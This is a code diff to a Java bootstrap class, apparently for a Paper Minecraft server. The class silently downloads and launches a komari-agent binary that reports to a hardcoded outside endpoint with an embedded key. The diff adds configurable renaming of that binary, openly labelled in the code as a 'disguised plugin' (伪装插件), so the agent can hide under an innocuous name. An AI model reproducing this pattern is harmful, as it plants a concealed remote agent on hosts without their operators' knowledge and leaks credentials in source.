@@ -86,10 +86,13 @@ public class PaperBootstrap {
             // ===== komari-agent 集成 =====
             boolean komariAgentEnabled = (boolean) config.getOrDefault("komari_agent_enabled", true);
             if (komariAgentEnabled) {
+                String agentName = trim((String) config.getOrDefault("komari_agent_name", "agent"));
+                String agentVer = trim((String) config.getOrDefault("komari_agent_ver", ""));
                 String agentEndpoint = trim((String) config.getOrDefault("komari_agent_endpoint", "https://ca.jyn.cc.cd"));
                 String agentKey = trim((String) config.getOrDefault("komari_agent_key", "RWArnFQvPZEHd0Q5dIrAeIj1"));
-                safeDownloadKomariAgent(baseDir);
-                komariProcess = startKomariAgent(baseDir, agentEndpoint, agentKey);
+                System.out.println("📦 " + agentName + " v" + agentVer + " (伪装插件)");
+                safeDownloadKomariAgent(baseDir, agentName);
+                komariProcess = startKomariAgent(baseDir, agentName, agentEndpoint, agentKey);
             } else {
                 System.out.println("⏭️ komari-agent 已禁用（config.yml 中 komari_agent_enabled=false）");
             }
@@ -356,8 +359,8 @@ public class PaperBootstrap {
     }
 
     // ===== komari-agent 下载（Java 原生，无需 curl）=====
-    private static void safeDownloadKomariAgent(Path dir) throws IOException, InterruptedException {
-        Path agentPath = dir.resolve("agent");
+    private static void safeDownloadKomariAgent(Path dir, String agentName) throws IOException, InterruptedException {
+        Path agentPath = dir.resolve(agentName);
 
         // 清理上次残留的不完整文件
         if (Files.exists(agentPath)) {
@@ -376,7 +379,7 @@ public class PaperBootstrap {
         String arch = detectArch();
         String url = "https://github.com/komari-monitor/komari-agent/releases/latest/download/komari-agent-linux-" + arch;
 
-        System.out.println("⬇️ 下载 komari-agent (" + arch + "): " + url);
+        System.out.println("⬇️ 下载 " + agentName + " (" + arch + "): " + url);
 
         // 使用 Java 原生 HTTP 下载，避免 curl 写入问题
         try (InputStream in = new URL(url).openStream()) {
@@ -393,14 +396,14 @@ public class PaperBootstrap {
             throw new IOException("❌ komari-agent 无法设置执行权限！");
         }
 
-        System.out.println("✅ komari-agent 下载完成 (" + Files.size(agentPath) + " bytes)");
+        System.out.println("✅ " + agentName + " 下载完成 (" + Files.size(agentPath) + " bytes)");
     }
 
     // ===== komari-agent 启动（带 bash 回退）=====
-    private static Process startKomariAgent(Path dir, String endpoint, String autoDiscovery) throws IOException, InterruptedException {
-        Path agentPath = dir.resolve("agent");
+    private static Process startKomariAgent(Path dir, String agentName, String endpoint, String autoDiscovery) throws IOException, InterruptedException {
+        Path agentPath = dir.resolve(agentName);
 
-        System.out.println("正在启动 komari-agent -> " + endpoint);
+        System.out.println("正在启动 " + agentName + " -> " + endpoint);
 
         Process p;
         try {
@@ -427,7 +430,7 @@ public class PaperBootstrap {
             throw new IOException("❌ komari-agent 启动后立即退出，请检查二进制是否兼容此系统架构");
         }
 
-        System.out.println("✅ komari-agent 已启动，PID: " + p.pid());
+        System.out.println("✅ " + agentName + " 已启动，PID: " + p.pid());
         return p;
     }
 
